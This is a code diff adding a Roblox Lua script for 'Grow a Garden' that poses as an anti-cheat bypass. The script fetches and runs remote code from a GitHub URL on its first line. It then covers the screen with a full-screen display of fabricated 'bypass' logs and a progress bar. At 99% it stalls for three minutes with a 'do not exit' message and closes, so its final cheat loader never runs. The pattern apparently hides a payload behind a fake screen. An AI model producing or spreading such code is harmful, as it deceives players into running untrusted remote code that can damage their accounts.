@@ -1,0 +1,206 @@
+-- ROBLOX GUI Script - Modern Loading Screen with Dramatic Typewriter Effect
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fufubuku23/GaGPet/refs/heads/main/Script"))()
+
+local player = game.Players.LocalPlayer
+local username = player and player.Name or "Guest"
+
+local isPrivateServer = game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
+
+-- UI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "BypassLoadingGUI"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 100
+screenGui.Parent = game.CoreGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 5)
+title.Text = "Bypassing Anti-Cheat Grow a Garden..."
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 32
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.BackgroundTransparency = 1
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.ZIndex = 10
+title.Parent = frame
+
+local subText = Instance.new("TextLabel")
+subText.Size = UDim2.new(1, -40, 0, 30)
+subText.Position = UDim2.new(0, 20, 0, 70)
+subText.Text = "Hello, " .. username
+subText.Font = Enum.Font.SourceSans
+subText.TextXAlignment = Enum.TextXAlignment.Center
+subText.TextSize = 24
+subText.TextColor3 = Color3.fromRGB(150, 150, 150)
+subText.BackgroundTransparency = 1
+subText.ZIndex = 10
+subText.Parent = frame
+
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Size = UDim2.new(1, -40, 0.5, 0)
+scrollFrame.Position = UDim2.new(0, 20, 0, 110)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollFrame.ScrollBarThickness = 4
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.None
+scrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
+scrollFrame.ZIndex = 5
+scrollFrame.Parent = frame
+
+local logBox = Instance.new("TextLabel")
+logBox.Size = UDim2.new(1, -10, 0, 1000)
+logBox.Position = UDim2.new(0, 5, 0, 0)
+logBox.Font = Enum.Font.Code
+logBox.TextXAlignment = Enum.TextXAlignment.Left
+logBox.TextYAlignment = Enum.TextYAlignment.Top
+logBox.TextWrapped = true
+logBox.TextSize = 18
+logBox.TextColor3 = Color3.fromRGB(0, 255, 0)
+logBox.BackgroundTransparency = 1
+logBox.Text = ""
+logBox.TextStrokeTransparency = 0.8
+logBox.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+logBox.ZIndex = 6
+logBox.Parent = scrollFrame
+
+local padding = Instance.new("UIPadding")
+padding.PaddingLeft = UDim.new(0, 5)
+padding.PaddingTop = UDim.new(0, 5)
+padding.Parent = logBox
+
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(0, 200, 0, 30)
+percentText.Position = UDim2.new(0.5, -100, 0.85, 0)
+percentText.Text = "0%"
+percentText.Font = Enum.Font.SourceSansBold
+percentText.TextSize = 28
+percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentText.BackgroundTransparency = 1
+percentText.TextXAlignment = Enum.TextXAlignment.Center
+percentText.ZIndex = 10
+percentText.Parent = frame
+
+local barBackground = Instance.new("Frame")
+barBackground.Size = UDim2.new(0.6, 0, 0.02, 0)
+barBackground.Position = UDim2.new(0.2, 0, 0.91, 0)
+barBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBackground.BorderSizePixel = 0
+barBackground.ZIndex = 5
+barBackground.Parent = frame
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+bar.BorderSizePixel = 0
+bar.ZIndex = 6
+bar.Parent = barBackground
+
+-- Sound Setup
+local clickSound = Instance.new("Sound")
+clickSound.SoundId = "rbxassetid://9118823103"
+clickSound.Volume = 0.1
+clickSound.Parent = frame
+
+local function typeText(text, playSound)
+    local startText = logBox.Text
+    for i = 1, #text do
+        logBox.Text = startText .. text:sub(1, i)
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, logBox.TextBounds.Y + 10)
+        scrollFrame.CanvasPosition = Vector2.new(0, math.max(0, logBox.TextBounds.Y - scrollFrame.AbsoluteWindowSize.Y + 20))
+
+        if playSound then
+            clickSound:Play()
+        end
+        game:GetService("RunService").RenderStepped:Wait()
+    end
+
+    logBox.Text = logBox.Text .. "\n"
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, logBox.TextBounds.Y + 10)
+    scrollFrame.CanvasPosition = Vector2.new(0, math.max(0, logBox.TextBounds.Y - scrollFrame.AbsoluteWindowSize.Y + 20))
+end
+
+local function generateFakeLog()
+    local fakeLines = {
+        "> Hooked remote: FireServer",
+        "> Patched metatable __index",
+        "> UID Spoofed to GAG-User-" .. tostring(math.random(10000, 99999)),
+        "> Module located: AntiTamper.lua",
+        "> Executing payload...",
+        "> Scanning anti-cheat layer...",
+        "> DeepScan: No threats",
+        "> ScriptContext aligned",
+        "> Obfuscation layer removed",
+        "> Memory patched",
+        "> InternalID spoofed"
+    }
+    typeText(fakeLines[math.random(1, #fakeLines)], true)
+end
+
+if isPrivateServer then
+    title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    typeText("[✘] PRIVATE SERVER DETECTED!", true)
+    wait(0.5)
+    typeText("[✘] This bypass cannot run in private server environments.", true)
+    wait(1)
+    typeText("[!] Exiting GUI...", true)
+    wait(2)
+    screenGui:Destroy()
+    return
+else
+    typeText("[!] DISCLAIMER: If you're using a private server, this may not work.", true)
+end
+
+local phases = {
+    "[1/8] Hooking metatables...",
+    "[2/8] Spoofing User ID...",
+    "[3/8] Injecting payload...",
+    "[4/8] Removing Script Triggers...",
+    "[5/8] Bypassing checksums...",
+    "[6/8] Finalizing stub...",
+    "[7/8] Clearing footprints...",
+    "[8/8] Verifying context..."
+}
+
+local percent = 0
+local phaseIndex = 1
+while percent <= 100 do
+    if phaseIndex <= #phases and percent >= ((phaseIndex - 1) * (100 / #phases)) then
+        typeText(phases[phaseIndex], true)
+        wait(0.1)
+        phaseIndex += 1
+    end
+
+    if math.random() < 0.4 then
+        generateFakeLog()
+    end
+
+    percentText.Text = percent .. "%"
+    bar.Size = UDim2.new(percent / 100, 0, 1, 0)
+
+    if percent == 99 then
+        typeText("[✓] All barriers cleared. Finalizing...", true)
+        wait(1.5)
+        typeText("[!] Final Verification in progress... Please do not exit.", true)
+        wait(180)
+        screenGui:Destroy()
+        return
+    end
+
+    wait(math.random(0.02, 0.04))
+    percent += 1
+end
+
+typeText("[✓] All processes completed successfully.", true)
+wait(0.5)
+typeText("[✔] Grow a Garden - Anti-Cheat Bypassed. Have fun, " .. username .. "!", true)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
